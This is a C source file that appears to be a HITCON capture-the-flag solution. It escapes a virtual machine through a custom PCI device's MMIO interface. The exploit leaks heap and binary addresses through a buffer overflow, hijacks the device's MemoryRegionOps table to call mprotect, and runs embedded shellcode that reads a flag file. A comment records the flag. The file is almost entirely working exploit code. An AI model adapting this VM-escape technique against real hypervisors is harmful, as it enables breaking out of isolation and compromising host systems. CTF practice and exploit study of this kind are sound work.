// gcc exploit.c -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

static uintptr_t virt2phys(uintptr_t addr);
static void dump(void *buf, size_t size);

#define OFFSET(addr)	((addr) - (TEXT_BASE))
#define ADDR(offset)	(addr_bin_base + (offset))

uintptr_t addr_bin_base = 0;
const uint64_t off_plt_mprotect        = 0x30c400;
const uint64_t off_maria_mmio_ops      = 0xf1ff80;

#define BUFF_SIZE 0x2000

struct reg_mmio {
	uint32_t do_rw;
	uint32_t src;
	uint32_t off;
};

static uint32_t buf_to_paddr(uintptr_t paddr, uint8_t off);
static void paddr_to_buf(uintptr_t paddr, uint8_t off);

static struct reg_mmio *mmio;

int main(int argc, char *argv[]){
	int mmio_fd;
	void *vmem;

	if((mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR|O_SYNC)) == -1){
		perror("open mmio");
		return -1;
	}

	if((mmio = mmap(NULL, 0x3000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0)) == MAP_FAILED){
		perror("mmap mmio");
		return -1;
	}

	if((vmem = mmap(NULL, BUFF_SIZE*0x20, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0)) == MAP_FAILED){
		perror("mmap anon");
		return -1;
	}

	uintptr_t priv_p = virt2phys((uintptr_t)vmem);
	for(void *p=vmem+0x1000; p < vmem + BUFF_SIZE*0x1f; p+=0x1000){
		uintptr_t cur_p = virt2phys((uintptr_t)p);

		void unmap_others(void){
			munmap(vmem, p-vmem-0x1000);
			munmap(p+0x1000, BUFF_SIZE*0x20-(p-vmem+0x1000));
		}

		if(cur_p == priv_p+0x1000){
			unmap_others();
			vmem = p-0x1000;
			break;
		}
		else if(cur_p == priv_p-0x1000){
			unmap_others();
			munmap(p, 0x1000);
			vmem = mmap(p-0x2000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
			break;
		}
		priv_p = cur_p;
	}

	uintptr_t pmem = virt2phys((uintptr_t)vmem);
	if(virt2phys((uintptr_t)vmem + 0x1000) != pmem + 0x1000){
		puts("non-continuous");
		return -1;
	}

	buf_to_paddr(pmem, 0xf0);
	uintptr_t *leaks = vmem+BUFF_SIZE-0xf0;
	uintptr_t addr_heap_maria_state = leaks[4];
	addr_bin_base = leaks[9] - off_maria_mmio_ops;
	printf("[+] addr_heap_maria_state = %p\n", (void*)addr_heap_maria_state);
	printf("[+] addr_bin_base         = %p\n", (void*)addr_bin_base);

	dump(vmem+BUFF_SIZE-0x100, 0x100);

	leaks[9] = addr_heap_maria_state + 0xa30 + 0xf0;
	leaks[10] = addr_heap_maria_state & ~((1<<12)-1);

	struct MemoryRegionOps {
		uint64_t read;	
		uint64_t write;	
		uint64_t endianness[3];
		uint32_t valid_min_access_size;
		uint32_t valid_max_access_size;
		uint64_t unaligned;
		uint64_t  accepts;
		uint32_t impl_min_access_size;
		uint32_t impl_max_access_size;
	} ops = {
		.read = addr_heap_maria_state + 0xa30 + 0x100 + 0xf0,
		.write = ADDR(off_plt_mprotect),
	};

	// pwn shellcraft -f c amd64.linux.readfile "/home/user/flag" STDOUT_FILENO
	char shellcode[] = {0x6a, 0x1, 0x41, 0x58, 0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50, 0x48, 0xb8, 0x64, 0x73, 0x2e, 0x67, 0x6d, 0x60, 0x66, 0x1, 0x48, 0x31, 0x4, 0x24, 0x48, 0xb8, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0xf, 0x5, 0x48, 0x89, 0xc3, 0x48, 0x89, 0xc7, 0x6a, 0x5, 0x58, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x48, 0x83, 0xc4, 0x30, 0x48, 0x8b, 0x14, 0x24, 0x49, 0x89, 0xd2, 0x6a, 0x28, 0x58, 0x4c, 0x89, 0xc7, 0x48, 0x89, 0xde, 0x99, 0xf, 0x5, 0x31, 0xff, 0x6a, 0x3c, 0x58, 0xf, 0x5}; 

	memcpy(vmem, &ops, sizeof(ops));
	memcpy(vmem+0x100, shellcode, sizeof(shellcode));
	dump(vmem+BUFF_SIZE-0x100, 0x100);

	paddr_to_buf(pmem, 0xf0);

	*((uint32_t*)((void*)mmio + 0x2000)) = PROT_READ|PROT_WRITE|PROT_EXEC;
	char c = *(char*)mmio;

	munmap(vmem, BUFF_SIZE);
	munmap(mmio, 0x1000);
	close(mmio_fd);
	// hitcon{roses_are_red_violets_are_blue_theres_buffer_overflow_on_line_32}

	return 0;
}

static uint32_t buf_to_paddr(uintptr_t paddr, uint8_t off){
	mmio->src = paddr;
	mmio->off = off;
	return mmio->do_rw;
}

static void paddr_to_buf(uintptr_t paddr, uint8_t off){
	mmio->src = paddr;
	mmio->off = off;
	mmio->do_rw = 0;
}

static uintptr_t virt2phys(uintptr_t addr){
	static int map_fd = -1;
	uintptr_t base;

	if(map_fd < 0)
		map_fd = open("/proc/self/pagemap", O_RDONLY);

	lseek(map_fd, sizeof(uintptr_t)*(addr >> 12), SEEK_SET);
	if(read(map_fd, &base, sizeof(uintptr_t)) < sizeof(uintptr_t))
		return -1;
	
	if(!(base & (1UL<<63)))
		return -1;

	base <<= 12;
	printf("virt : 0x%016lx -> phys : 0x%016lx\n", addr & ~((1<<12)-1), base);

	return base | (addr & ((1<<12)-1));
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
